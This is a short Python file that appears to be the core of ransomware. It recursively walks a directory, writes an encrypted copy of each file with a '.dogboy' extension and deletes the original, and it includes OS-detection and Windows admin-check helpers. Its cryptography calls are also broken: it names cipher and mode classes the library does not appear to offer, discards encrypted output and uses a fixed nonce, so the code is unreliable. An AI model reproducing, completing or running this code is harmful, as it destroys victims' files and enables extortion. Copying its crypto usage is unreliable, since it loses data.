from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
from platform import *
import os,ctypes
class encryption_:
    def encrypt(filepath, password, salt, args):
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000)
        key = kdf.derive(password)
        for root, dirs, files in os.walk(filepath):
            for name in files:
                filename = os.path.join(root, name)
                encryption_.encFile(filename, key, args)

    def encFile(filename, key, args):
        with open(filename, "rb") as f_in:
            with open(filename + ".dogboy", "wb") as f_out:
                encryptor = Cipher(algorithms.XSalsa20,key,modes.OpenSSLRaw(b"nonce")).encryptor()
                encryptor.update(f_in.read())
                f_out.write(encryptor.finalize())
                if not args.quiet:
                    print(f"Encrypted: {filename}")
        os.remove(filename)

    def getsys():
        sys_ = ""
        match system():
            case "Windows":
                sys_ = "win"
            case "Linux":
                sys_ = "lin"
            case "Darwin":
                sys_ = "mac"
            case _:
                sys_ = "invalid"
        return sys_

    def isAdmin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False